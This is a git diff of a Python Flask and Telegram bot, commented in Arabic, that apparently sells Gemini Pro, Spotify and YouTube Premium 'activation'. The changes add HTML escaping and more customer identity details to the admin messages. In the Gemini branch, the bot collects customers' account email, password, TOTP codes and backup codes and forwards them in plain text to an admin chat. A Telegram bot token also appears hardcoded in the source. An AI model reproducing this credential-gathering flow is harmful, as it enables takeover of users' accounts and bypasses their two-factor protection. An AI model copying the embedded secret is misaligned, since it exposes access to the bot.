@@ -4,6 +4,7 @@ import json
 import os
 from flask import Flask, request
 import sys
+import html # مكتبة لحماية البوت من الرموز الخاطئة التي يكتبها العميل
 
 API_TOKEN = '8840162276:AAGP0Ypb-n5TW67SMLnL2ROD4mw_a5x2DrY'
 ADMIN_ID = '8227136699'
@@ -17,7 +18,7 @@ app = Flask(__name__)
 def index():
     return "السيرفر يعمل بنجاح ومستيقظ 24/7!", 200
 
-# مسار الربط 
+# مسار الربط
 @app.route('/setup')
 def setup_webhook():
     try:
@@ -42,10 +43,9 @@ def getMessage():
 def send_welcome(message):
     markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
     
-    # 💡 التغيير السحري هنا: غيرنا كلمة "تفعيل" إلى "طلب" والرموز التعبيرية لكسر عناد تيليجرام
     btn1 = KeyboardButton(text="✨ طلب Gemini Pro", web_app=WebAppInfo(url="https://hanynew.github.io/mybot/gemini.html"))
     btn2 = KeyboardButton(text="🎶 طلب Spotify Premium", web_app=WebAppInfo(url="https://hanynew.github.io/mybot/spotify.html"))
-    btn3 = KeyboardButton(text="📺 طلب YouTube  Premium", web_app=WebAppInfo(url="https://hanynew.github.io/mybot/youtube.html"))
+    btn3 = KeyboardButton(text="📺 طلب YouTube Premium", web_app=WebAppInfo(url="https://hanynew.github.io/mybot/youtube.html"))
     
     markup.add(btn1, btn2, btn3)
     bot.send_message(message.chat.id, "أهلاً بك!\nالرجاء اختيار الخدمة المطلوبة من القائمة بالأسفل 👇:", reply_markup=markup)
@@ -53,27 +53,51 @@ def send_welcome(message):
 @bot.message_handler(content_types=['web_app_data'])
 def handle_web_app_data(message):
     chat_id = message.chat.id
-    username = f"@{message.from_user.username}" if message.from_user.username else "بدون معرف"
+    
+    # 💡 استخراج بيانات العميل (الاسم، المعرف، والايدي)
+    user = message.from_user
+    first_name = user.first_name if user.first_name else ""
+    last_name = user.last_name if user.last_name else ""
+    
+    # تنظيف الاسم والمعرف من أي رموز قد تعطل البوت
+    full_name = html.escape(f"{first_name} {last_name}".strip() or "بدون اسم")
+    username = html.escape(f"@{user.username}") if user.username else "لا يوجد معرف"
+    user_id = user.id
+    
+    # 🔗 الميزة السحرية: رابط مباشر يفتح محادثة مع العميل حتى لو لم يكن لديه يوزر!
+    user_link = f"<a href='tg://user?id={user_id}'>اضغط هنا لمراسلة العميل 💬</a>"
     
     try:
+        # قراءة البيانات المرسلة من النافذة وتنظيفها من الرموز
         data = json.loads(message.web_app_data.data)
         service = data.get('service', 'gemini')
         
-        # إخفاء الكيبورد وإرسال رسالة التأكيد للعميل
+        # رسالة تأكيد للعميل وإخفاء النافذة
         user_reply = "طلبك قيد التنفيذ الرجاء الانتظار ⏳\n\nالادارة والاستفسار: @bdallhshay7"
         hide_markup = ReplyKeyboardRemove()
         bot.send_message(chat_id, user_reply, reply_markup=hide_markup)
         
-        # إرسال البيانات إليك كآدمن
+        # تجهيز الرسالة للإدارة بصيغة HTML الآمنة 100%
         if service == "spotify":
-            admin_msg = f"🎧 **طلب تفعيل Spotify**\n👤 العميل: {username}\n🔗 الرابط: `{data.get('link', 'غير متوفر')}`"
+            link = html.escape(data.get('link', 'غير متوفر'))
+            admin_msg = f"🎧 <b>طلب تفعيل Spotify</b>\n👤 الاسم: {full_name}\n🔹 المعرف: {username}\n🆔 الايدي: <code>{user_id}</code>\n🔗 {user_link}\n\n🔗 الرابط: <code>{link}</code>"
+        
         elif service == "youtube":
-            admin_msg = f"▶️ **طلب تفعيل YouTube**\n👤 العميل: {username}\n🔗 الرابط: `{data.get('link', 'غير متوفر')}`"
+            link = html.escape(data.get('link', 'غير متوفر'))
+            admin_msg = f"▶️ <b>طلب تفعيل YouTube</b>\n👤 الاسم: {full_name}\n🔹 المعرف: {username}\n🆔 الايدي: <code>{user_id}</code>\n🔗 {user_link}\n\n🔗 الرابط: <code>{link}</code>"
+        
         else:
-            admin_msg = f"🤖 **طلب تفعيل Gemini Pro**\n👤 العميل: {username}\n📧 الحساب: `{data.get('email', 'غير متوفر')}`\n🔑 الباسورد: `{data.get('password', 'غير متوفر')}`\n🔒 TOTP: `{data.get('totp', 'لا يوجد')}`\n🛡️ احتياطي: `{data.get('backup', 'لا يوجد')}`"
+            email = html.escape(data.get('email', 'غير متوفر'))
+            password = html.escape(data.get('password', 'غير متوفر'))
+            totp = html.escape(data.get('totp', 'لا يوجد'))
+            backup = html.escape(data.get('backup', 'لا يوجد'))
+            admin_msg = f"🤖 <b>طلب تفعيل Gemini Pro</b>\n👤 الاسم: {full_name}\n🔹 المعرف: {username}\n🆔 الايدي: <code>{user_id}</code>\n🔗 {user_link}\n\n📧 الحساب: <code>{email}</code>\n🔑 الباسورد: <code>{password}</code>\n🔒 TOTP: <code>{totp}</code>\n🛡️ احتياطي: <code>{backup}</code>"
 
-        bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
+        # إرسال البيانات لك (الآدمن)
+        bot.send_message(ADMIN_ID, admin_msg, parse_mode="HTML")
+        
     except Exception as e:
+        print(f"Error: {e}", file=sys.stderr)
         bot.send_message(chat_id, "حدث خطأ أثناء معالجة الطلب. يرجى المحاولة لاحقاً.")
 
 if __name__ == "__main__":
